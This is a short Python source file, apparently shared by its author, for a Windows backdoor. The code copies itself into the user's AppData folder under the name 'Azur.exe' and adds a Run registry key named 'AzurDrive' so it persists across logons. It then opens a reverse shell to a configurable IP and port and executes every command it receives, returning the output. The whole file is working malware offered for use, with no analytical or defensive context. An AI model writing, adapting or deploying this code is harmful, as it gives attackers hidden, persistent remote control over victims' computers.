# -*- coding: utf-8 -*- 
#Coded By Samad Bloch

import subprocess
import socket
import shutil
import sys
import os
import time

ip = "127.0.0.1" #your ip
port = 4444 #your port

time.sleep(5)

locate = os.environ["appdata"] + "\\Azur.exe"
if not os.path.exists(locate):
    shutil.copyfile(sys.executable,locate)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AzurDrive /t REG_SZ /d "' + locate + '"', shell=True)

time.sleep(7)

def command_exe(cmd):
    return subprocess.check_output(cmd, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect((ip, port))



connection.send('''\n
███████╗██╗  ██╗███████╗██╗     ██╗          █████╗  ██████╗████████╗██╗██╗   ██╗ █████╗ ████████╗███████╗██████╗     
██╔════╝██║  ██║██╔════╝██║     ██║         ██╔══██╗██╔════╝╚══██╔══╝██║██║   ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗    
███████╗███████║█████╗  ██║     ██║         ███████║██║        ██║   ██║██║   ██║███████║   ██║   █████╗  ██║  ██║    
╚════██║██╔══██║██╔══╝  ██║     ██║         ██╔══██║██║        ██║   ██║╚██╗ ██╔╝██╔══██║   ██║   ██╔══╝  ██║  ██║    
███████║██║  ██║███████╗███████╗███████╗    ██║  ██║╚██████╗   ██║   ██║ ╚████╔╝ ██║  ██║   ██║   ███████╗██████╔╝    
╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝  ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═════╝     
                              Coded By IG: @samad_bl0ch aka Malicious
\n''')


while True:
    cmd = connection.recv(1024)
    result = command_exe(cmd)
    connection.send(result)

connection.close()    